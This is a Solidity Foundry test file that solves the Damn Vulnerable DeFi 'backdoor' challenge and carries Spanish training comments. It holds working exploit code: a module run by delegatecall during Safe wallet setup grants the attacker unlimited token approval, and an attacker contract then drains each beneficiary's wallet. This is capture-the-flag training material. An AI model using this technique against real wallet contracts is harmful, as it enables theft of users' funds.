// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

/*
 * NEXUS Offensive · training/dvd · reto "backdoor"
 *
 * CLASE DE BUG: inicialización peligrosa de una Safe wallet. `Safe.setup`
 *   acepta un `to`/`data` que se ejecuta por DELEGATECALL durante la creación.
 *   Al crear la wallet de cada beneficiario (vía la factory, con el registro
 *   como callback), se inyecta un delegatecall que hace que la Safe APRUEBE al
 *   atacante a gastar sus tokens. Tras cobrar la recompensa (10 por wallet), el
 *   atacante drena las 4 wallets. Todo en una sola tx.
 *
 * FAMILIA: Control de acceso / inicialización (relacionado con FL — autorización).
 *
 * INVARIANTE QUE LO ATRAPA:
 *   La inicialización de una wallet no debe otorgar permisos de gasto de sus
 *   fondos a terceros. Se rompe: cada Safe recién creada aprueba al atacante.
 */
contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        startHoax(deployer);
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();
        token = new DamnValuableToken();
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
        vm.stopPrank();
    }

    function test_backdoor() public checkSolvedByPlayer {
        // Una sola tx del player: desplegar el atacante (crea las 4 wallets y drena).
        BackdoorAttacker attacker = new BackdoorAttacker(
            users, walletFactory, address(singletonCopy), walletRegistry, token, recovery
        );

        // INV rota: la primera wallet creada aprobó al atacante a gastar sus tokens.
        console.log("allowance otorgada al atacante por la 1a wallet:", token.allowance(attacker.firstWallet(), address(attacker)));
        assertGt(token.allowance(attacker.firstWallet(), address(attacker)), 0, "INV rota: la wallet aprobo a un tercero");
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private view {
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);
            assertTrue(wallet != address(0), "User didn't register a wallet");
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

/// @notice Módulo "puerta trasera": ejecutado por delegatecall durante setup,
///         hace que la Safe apruebe al spender a gastar sus tokens.
contract BackdoorModule {
    function approve(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}

/// @notice Crea una Safe por beneficiario inyectando la puerta trasera y drena.
contract BackdoorAttacker {
    address public firstWallet;

    constructor(
        address[] memory beneficiaries,
        SafeProxyFactory factory,
        address singleton,
        WalletRegistry registry,
        DamnValuableToken token,
        address recovery
    ) {
        BackdoorModule module = new BackdoorModule();

        for (uint256 i = 0; i < beneficiaries.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];

            bytes memory setupData = abi.encodeCall(
                Safe.setup,
                (
                    owners,
                    1,
                    address(module),
                    abi.encodeCall(BackdoorModule.approve, (address(token), address(this))),
                    address(0), // fallbackHandler (el registro exige 0)
                    address(0),
                    0,
                    payable(address(0))
                )
            );

            SafeProxy proxy = factory.createProxyWithCallback(singleton, setupData, i, registry);
            if (i == 0) firstWallet = address(proxy);

            // La wallet ya tiene 10 tokens (pagados por el registro) y nos aprobó.
            token.transferFrom(address(proxy), recovery, 10e18);
        }
    }
}
